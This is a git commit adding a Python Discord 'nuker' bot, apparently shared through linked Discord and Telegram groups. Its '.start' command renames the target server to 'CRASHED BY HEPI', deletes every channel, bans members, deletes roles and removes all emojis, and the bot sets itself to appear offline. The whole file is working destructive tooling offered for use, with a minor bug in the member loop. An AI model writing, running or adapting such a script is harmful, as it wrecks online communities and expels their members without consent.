044b54cac4970963206b59cc4bf5fbc960aa8af2
MrProCatYT <62401907+MrProCatYT@users.noreply.github.com>
2020-12-22 09:34:52 +0400

    Create hepi.py

---
+++ hepi.py
@@ -0,0 +1,53 @@
+import discord, os, sys, random, string, requests
+from discord.ext import commands
+from discord import Permissions
+
+def clear():
+  if os.sys.platform == "win32":
+    os.system("cls")
+  else:
+    os.system("clear")
+
+client = commands.Bot(command_prefix='.')
+@client.event
+async def on_ready():
+    await client.change_presence(status=discord.Status.offline)
+
+clear()
+print(""" __    __   _______ .______    __  
+|  |  |  | |   ____||   _  \  |  | 
+|  |__|  | |  |__   |  |_)  | |  | 
+|   __   | |   __|  |   ___/  |  | 
+|  |  |  | |  |____ |  |      |  | 
+|__|  |__| |_______|| _|      |__| 
+                                   """)
+print("Discord: https://discord.com/invite/ZmheYFnUsb\nTelegram: https://t.me/termuxpalace")
+
+@client.command()
+async def start(ctx):
+  await ctx.guild.edit(name='CRASHED BY HEPI')
+  for channel in ctx.guild.channels:
+    await channel.delete()
+  ban = 0
+  for member in ctx.guild.member:
+    try:
+      ban += 1
+      await member.ban()
+    except:
+      continue
+  roles = ctx.guild.roles
+  roles.pop(0)
+  for role in roles:
+    if ctx.guild.me.roles[-1] > role:
+      await role.delete()
+    else:
+      break
+  for emoji in list(ctx.guild.emojis):
+    try:
+      await emoji.delete()
+    except:
+      pass
+try:
+  client.run('ВВЕДИТЕ ТОКЕН')
+except Exception:
+  pass
